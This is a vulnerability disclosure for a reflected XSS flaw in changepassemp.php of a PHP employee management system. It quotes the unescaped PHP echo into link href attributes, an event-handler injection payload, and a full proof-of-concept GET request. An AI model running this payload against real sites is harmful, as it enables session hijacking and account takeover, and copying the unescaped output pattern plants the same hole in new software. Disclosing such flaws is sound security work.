## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/changepassemp.php` contains a Reflected XSS (HTML attribute injection) vulnerability

Impact of the vulnerability
An attacker can craft a malicious URL that injects attacker-controlled content into HTML attributes on the “Change Password” page. When a victim visits the URL, the injected attribute (e.g., an event handler) may execute JavaScript in the victim’s browser, potentially leading to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (actions performed as the victim)
- Phishing/UI manipulation (modifying page content to trick users)

### Payload:

"OnMoUsEoVeR=prompt(1)//

```
"OnMoUsEoVeR=prompt(1)//
```



### POC:

The vulnerable endpoint is `GET /changepassemp.php?id=...`. The `id` query parameter is embedded into navigation link `href` attributes without HTML escaping:

<ul id="navli">

  <li><a class="homeblack" href="eloginwel.php?id=<?php echo $id?>"">HOME</a></li>

  <li><a class="homered" href="myprofile.php?id=<?php echo $id?>"">My Profile</a></li>

  <li><a class="homeblack" href="applyleave.php?id=<?php echo $id?>"">Apply Leave</a></li>

Send the following request (URL-encoded payload recommended):

GET /changepassemp.php?id=%22OnMoUsEoVeR%3Dprompt%281%29%2F%2F HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
The response HTML shows the injected string inside link attributes (e.g., `href="myprofile.php?id="OnMoUsEoVeR=prompt(1)//""`). When the victim moves the mouse over the affected link, the injected event handler triggers JavaScript execution (e.g., `prompt(1)`), confirming reflected XSS / attribute injection.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409153307755](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409153307755.png)